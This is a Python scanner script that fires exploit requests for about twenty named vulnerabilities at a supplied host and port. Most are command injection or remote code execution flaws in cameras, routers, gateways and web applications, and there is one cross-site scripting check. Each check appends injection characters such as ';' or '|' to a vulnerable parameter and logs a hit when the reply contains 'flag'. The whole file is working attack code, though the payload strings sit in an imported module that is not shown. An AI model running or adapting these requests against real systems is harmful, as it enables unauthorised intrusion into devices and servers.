#!/usr/bin/python3

import http.client
import imports.poc_lists
import requests
import time

http.client.HTTPConnection._http_vsn = 10
http.client.HTTPConnection._http_vsn_str = 'HTTP/1.0'

TMOUT=10

headers = {
    "Accept":"application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
    "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50", 
    "Content-Type":"application/x-www-form-urlencoded",
    "Connection":"close",
    "Referer":"http://time.windows.com/"
    }

class req_verify:
    def __init__(self, url, port):
        self.url = url
        self.port = port

    def check(self, pocname, response, payload):
        filewrite = open("log.txt", "a+")
        if response.find("flag") is not -1:
            result = time.strftime("[%H:%M:%S]", time.localtime()) + " Exist: " + pocname + "\r\n"+ payload
            print(result)
            filewrite.writelines(result + "\n")
        else:
            result = time.strftime("[%H:%M:%S]", time.localtime()) + " Not: " + pocname
            print(result)
            filewrite.writelines(result + "\n")

    def req80(self):
        try:
            page = "/action.php;"
            poc = imports.poc_lists.load80['flag']
            payload = "http://" + self.url + ":" + self.port + page + poc
            response = requests.get(payload, headers=headers, timeout=TMOUT, verify=False)
            self.check("[CVE-2019-14931]", response.text, payload)
        except Exception as e:
            print(e)

        try:
            page = "/index.php?plot=;"
            poc = imports.poc_lists.load80['flag']
            payload = "http://" + self.url + ":" + self.port + page + poc
            response = requests.get(payload, headers=headers, timeout=TMOUT, verify=False)
            self.check("[Sar2HTML 3.2.1 Remote Command Execution]", response.text, payload)
        except Exception as e:
            print(e)

        try:
            page = "/cgi-bin/protected/discover_and_manage.cgi?action=snmp_browser&hst_id=none&snmpv3_profile_id=&ip_address=|"
            poc = imports.poc_lists.load80['flag']
            payload = "http://" + self.url + ":" + self.port + page + poc
            response = requests.get(payload, headers=headers, timeout=TMOUT, verify=False)
            self.check("[CVE-2019-16072]", response.text, payload)
        except Exception as e:
            print(e)

        try:
            page = "/VhttpdMgr?action=importFile&fileName="
            poc = imports.poc_lists.load80['flag']
            payload = "http://" + self.url + ":" + self.port + page + poc
            response = requests.get(payload, headers=headers, timeout=TMOUT, verify=False)
            self.check("[CVE-2013-5912]", response.text, payload)
        except Exception as e:
            print(e)

        try:
            page = "/cgi-bin/test?iperf=;"
            poc = imports.poc_lists.load80['flag']
            payload = "http://" + self.url + ":" + self.port + page + poc
            response = requests.get(payload, headers=headers, timeout=TMOUT, verify=False)
            self.check("[ACTi ASOC2200 Remote Code Execution]", response.text, payload)
        except Exception as e:
            print(e)

        try:
            page = "/utility.cgi?testType=1&IP=aaa || "
            poc = imports.poc_lists.load80['flag']
            payload = "http://" + self.url + ":" + self.port + page + poc
            response = requests.get(payload, headers=headers, timeout=TMOUT, verify=False)
            self.check("[3Com Office Connect Remote Code Execution]", response.text, payload)
        except Exception as e:
            print(e)

        try:
            page = "/scripts/rpc.php?action=updatetime&timeserver=||"
            poc = imports.poc_lists.load80['flag']
            payload = "http://" + self.url + ":" + self.port + page + poc
            response = requests.get(payload, headers=headers, timeout=TMOUT, verify=False)
            self.check("[CVE-2006-4000]", response.text, payload)
        except Exception as e:
            print(e)

        try:
            page = "/cgi-bin/preview_email.cgi?file=/mail/mlog/|"
            poc = imports.poc_lists.load80['flag']
            payload = "http://" + self.url + ":" + self.port + page + poc
            response = requests.get(payload, headers=headers, timeout=TMOUT, verify=False)
            self.check("[EyeLock nano NXT 3.5 Remote Code Execution]", response.text, payload)
        except Exception as e:
            print(e)

        try:
            page = "/html/SetSmarcardSettings.php"
            poc = imports.poc_lists.load80['Iris ID IrisAccess ICU 7000-2']
            payload = "http://" + self.url + ":" + self.port + page
            response = requests.post(payload, headers=headers, data=poc, timeout=TMOUT, verify=False)
            self.check("[Iris ID IrisAccess ICU 7000-2 Cross-Site Scripting]", response.text, payload)
        except Exception as e:
            print(e)

        try:
            page = "/actionHandler/ajax_network_diagnostic_tools.php"
            poc = imports.poc_lists.load80['Xfinity Gateway']
            payload = "http://" + self.url + ":" + self.port + page
            response = requests.post(payload, headers=headers, data=poc, timeout=TMOUT, verify=False)
            self.check("[Xfinity Gateway Remote Code Execution]", response.text, payload)
        except Exception as e:
            print(e)

        try:
            page = "/cgi-bin/operator/servetest?cmd="
            poc = imports.poc_lists.load80['flag']
            payload = "http://" + self.url + ":" + self.port + page + poc
            response = requests.get(payload, headers=headers, timeout=TMOUT, verify=False)
            self.check("[Beward N100 Authenticated Remote Code Execution]", response.text, payload)
        except Exception as e:
            print(e)

        try:
            page = "/page/maintenance/lanSettings/dns"
            poc = imports.poc_lists.load80['FLIR Thermal Camera']
            payload = "http://" + self.url + ":" + self.port + page
            response = requests.post(payload, headers=headers, data=poc, timeout=TMOUT, verify=False)
            self.check("[FLIR Thermal Camera Command Injection]", response.text, payload)
        except Exception as e:
            print(e)

        try:
            page = "/goform/formSysCmd"
            poc = imports.poc_lists.load80['Sapido RB-1732']
            payload = "http://" + self.url + ":" + self.port + page
            response = requests.post(payload, headers=headers, data=poc, timeout=TMOUT, verify=False)
            self.check("[Sapido RB-1732 Remote Command Execution]", response.text, payload)
        except Exception as e:
            print(e)

        try:
            page = "/users/%2f/%2fproc%2fself%2fcomm"
            poc = imports.poc_lists.load80['CVE-2016-0752']
            payload = "http://" + self.url + ":" + self.port + page
            response = requests.post(payload, headers=headers, data=poc, timeout=TMOUT, verify=False)
            self.check("[CVE-2016-0752]", response.text, payload)
        except Exception as e:
            print(e)

        try:
            page = "/SGPAdmin/fileRequest"
            poc = imports.poc_lists.load80['CVE-2014-3914']
            payload = "http://" + self.url + ":" + self.port + page
            response = requests.post(payload, headers=headers, data=poc, timeout=TMOUT, verify=False)
            self.check("[CVE-2014-3914]", response.text, payload)
        except Exception as e:
            print(e)

        try:
            page = "/moadmin/moadmin.php"
            poc = imports.poc_lists.load80['CVE-2015-2208']
            payload = "http://" + self.url + ":" + self.port + page
            response = requests.post(payload, headers=headers, data=poc, timeout=TMOUT, verify=False)
            self.check("[CVE-2015-2208]", response.text, payload)
        except Exception as e:
            print(e)

    def req161(self):
        try:
            page = "/mnt_ping.cgi?isSubmit=1&addrType=3&pingAddr=;"
            poc = imports.poc_lists.load161['CVE-2019-18396']
            payload = "http://" + self.url + ":" + self.port + page + poc
            response = requests.get(payload, headers=headers, timeout=TMOUT, verify=False)
            self.check("[CVE-2019-18396]", response.text, payload)
        except Exception as e:
            print(e)

    def req8081(self):
        try:
            page = "/pages/systemcall.php?command="
            poc = imports.poc_lists.load8081['flag']
            payload = "http://" + self.url + ":" + self.port + page + poc
            response = requests.get(payload, headers=headers, timeout=TMOUT, verify=False)
            self.check("[CVE-2019-17270]", response.text, payload)
        except Exception as e:
            print(e)

        try:
            page = "/u/jsp/tools/exec.jsp"
            poc = imports.poc_lists.load8081['CVE-2017-16602']
            payload = "http://" + self.url + ":" + self.port + page
            response = requests.post(payload, headers=headers, data=poc, timeout=TMOUT, verify=False)
            self.check("[CVE-2017-16602]", response.text, payload)
        except Exception as e:
            print(e)